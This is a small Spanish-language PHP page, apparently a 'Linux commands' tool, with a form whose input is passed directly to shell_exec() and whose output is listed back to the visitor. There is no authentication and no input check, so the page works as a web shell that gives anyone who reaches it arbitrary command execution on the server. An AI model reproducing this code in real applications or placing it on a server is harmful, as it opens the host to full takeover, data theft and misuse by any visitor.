<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comandos de Linux</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="header">
        <h1>Comandos Linux</h1>
    </div>
    
    <div class="command-container">
        <form method="post">
            <input type="text" name="command" id="command" placeholder="Pon un comando" required>
            <button type="submit">Ejecutar</button>
        </form>
    </div>

    <!-- Área de resultados -->
    <div class="results">
    <?php
    // Si se envía el formulario, ejecutar el comando
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        // Recibir el comando
        $command = $_POST["command"];

        // Ejecutar el comando usando shell_exec
        $output = shell_exec($command);

        // Mostrar la salida si tiene contenido
        if ($output) {
            // Dividir el contenido en líneas
            $lines = explode("\n", htmlspecialchars($output));
            echo "<ul>";
            foreach ($lines as $line) {
                echo "<li>" . $line . "</li>";
            }
            echo "</ul>";
        }
    }
    ?>
</div>
</body>
</html>
